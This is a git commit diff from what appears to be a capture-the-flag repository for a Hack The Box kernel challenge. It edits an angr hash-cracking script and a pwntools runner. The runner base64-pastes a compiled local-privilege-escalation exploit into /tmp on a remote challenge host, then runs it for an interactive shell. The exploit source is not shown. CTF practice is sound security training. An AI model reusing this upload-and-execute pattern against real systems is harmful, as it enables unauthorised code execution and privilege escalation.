9322a30b7df9d84f2ae4c80f14a7c8f4aae0f94c
Jordi <sroot079@gmail.com>
2023-04-24 18:31:27 -0400

    complete htb kernel and cleanup

--- htb/kernel-advantures-part-1/release/crack_hash.py
+++ htb/kernel-advantures-part-1/release/crack_hash.py
@@ -1,12 +1,12 @@
 import angr
 import sys
 
-project = angr.Project("./hash2");
+project = angr.Project("./hash");
 state = project.factory.entry_state()
 
 simmgr = project.factory.simulation_manager(state)
 
-simmgr.explore(find=lambda state: b"Found" in state.posix.dumps(1))
+simmgr.explore(find=lambda state: b"win" in state.posix.dumps(1))
 
 if simmgr.found:
     for byte in simmgr.found[0].posix.dumps(0):
--- htb/kernel-advantures-part-1/release/exp.py
+++ htb/kernel-advantures-part-1/release/exp.py
@@ -3,32 +3,24 @@ from pwn import *
 import os
 context.log_level='debug'
 context.arch='amd64'
-#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
-# p=process('./pwn')
 ru 		= lambda a: 	p.readuntil(a)
 r 		= lambda n:		p.read(n)
 sla 	= lambda a,b: 	p.sendlineafter(a,b)
 sa 		= lambda a,b: 	p.sendafter(a,b)
 sl		= lambda a: 	p.sendline(a)
 s 		= lambda a: 	p.send(a)
-# gdb.attach(p)
 
-os.system("x86_64-linux-musl-gcc exploit.c -o exploit -s -static -lpthread")
-# os.system("mv exploit rootfs/")
-# os.system("cd rootfs/; find .|cpio -o --format=newc > ../rootfs.cpio")
-# os.system("cd ..; gzip rootfs.cpio")
+# os.system("x86_64-linux-musl-gcc exploit.c -o exploit -s -static -lpthread")
+# os.system("cat exploit|base64 > output.txt")
 
-os.system("gzip -f exploit;cat exploit.gz|base64 > output.txt")
-
-p=remote("161.35.36.167", 32654)
+p = remote("143.110.166.8", 31343)
 
 content=""
 
 with open('output.txt') as openfileobject:
     content=openfileobject.read()
 
-sla(b"$ ", 'cd /tmp && echo "'+content+'" | base64 -d > exploit.gz')
-sla(b"$ ", b"gzip -d exploit.gz")
+sla(b"$ ", 'cd /tmp && echo "'+content+'" | base64 -d > exploit')
 sla(b"$ ", b"chmod +x exploit && ./exploit")
 
 p.interactive()
